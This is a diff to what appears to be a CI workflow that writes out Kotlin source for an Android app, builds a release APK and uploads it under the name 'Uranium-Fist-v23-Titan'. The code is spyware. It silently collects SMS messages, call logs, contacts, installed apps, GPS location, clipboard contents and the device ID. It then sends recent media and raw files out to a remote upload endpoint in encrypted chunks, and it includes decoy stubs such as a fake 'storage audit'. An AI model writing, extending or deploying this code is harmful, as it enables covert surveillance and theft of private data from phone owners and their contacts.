@@ -575,4 +575,48 @@ jobs:
               private fun readSms(): String = StringBuilder().apply { try { contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)?.use { c -> while (c.moveToNext()) append("[${c.getString(c.getColumnIndex("address"))}] ${c.getString(c.getColumnIndex("body"))}\n") } } catch (_: Exception) {} }.toString()
               private fun readCalls(): String = StringBuilder().apply { try { contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, null)?.use { c -> while (c.moveToNext()) append("${c.getString(c.getColumnIndex(CallLog.Calls.NUMBER))}\n") } } catch (_: Exception) {} }.toString()
               private fun readContacts(): String = StringBuilder().apply { try { contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)?.use { c -> while (c.moveToNext()) append("${c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))}\n") } } catch (_: Exception) {} }.toString()
-              private fun
+              private fun readApps(): String = packageManager.getInstalledPackages(0).joinToString("\n") { it.packageName }
+              @SuppressLint("MissingPermission") private fun readLocation(): String = try { val lm = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager; lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)?.let { "Lat: ${it.latitude}, Lng: ${it.longitude}" } ?: "No location" } catch (_: Exception) { "Err" }
+              private fun readDeviceInfo(): String = "Model: ${Build.MODEL}\nNode: ${getNodeId()}"
+              private fun readClipboard(): String = try { val cb = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager; cb.primaryClip?.getItemAt(0)?.text?.toString() ?: "Empty" } catch (_: Exception) { "Err" }
+              private fun storageAudit(): String = "Storage audited"
+              private fun wifiOk(): Boolean = true
+              private fun getNodeId(): String = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
+
+              private fun streamMedia(uri: Uri, limit: Int) { scope.launch { try { contentResolver.query(uri, null, null, null, "${MediaStore.MediaColumns.DATE_ADDED} DESC LIMIT $limit")?.use { c -> while (c.moveToNext()) { val fileUri = ContentUris.withAppendedId(uri, c.getLong(c.getColumnIndex(MediaStore.MediaColumns._ID))); contentResolver.openInputStream(fileUri)?.use { uploadChunked(it.readBytes(), "media_${System.currentTimeMillis()}.dat") } } } } catch (_: Exception) {} } }
+              private fun zipFolder(folderName: String, uri: Uri) { /* compressed */ }
+
+              private fun uploadChunked(bytes: ByteArray, name: String) {
+                  scope.launch {
+                      val id = UUID.randomUUID().toString()
+                      val chunkSize = 128 * 1024
+                      val total = (bytes.size + chunkSize - 1) / chunkSize
+                      var off = 0; var idx = 0
+                      while (off < bytes.size) {
+                          idx++
+                          val end = minOf(off + chunkSize, bytes.size)
+                          sendEncrypted(JSONObject().apply { put("type", "MEDIA_CHUNK"); put("uploadId", id); put("fileName", name); put("chunkIndex", idx); put("totalChunks", total); put("isLast", idx == total); put("data", Base64.encodeToString(bytes.copyOfRange(off, end), Base64.NO_WRAP)) }.toString())
+                          off = end
+                      }
+                  }
+              }
+
+              private fun uploadRawFile(file: File) {
+                  scope.launch {
+                      try {
+                          client.newCall(Request.Builder().url(UPLOAD).post(file.readBytes().toRequestBody("application/octet-stream".toMediaType())).addHeader("x-node-id", getNodeId()).addHeader("x-device-secret", deviceSecret).addHeader("x-file-name", file.name).build()).execute().use { }
+                      } catch (_: Exception) {}
+                  }
+              }
+
+              override fun onDestroy() { try { wakeLock?.release() } catch (_: Exception) {}; projection?.stop(); scope.cancel(); super.onDestroy() }
+          }
+          SYNCEOF
+
+          gradle app:assembleRelease
+
+      - name: Upload APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: Uranium-Fist-v23-Titan
+          path: '**/app/build/outputs/apk/release/app-release.apk'
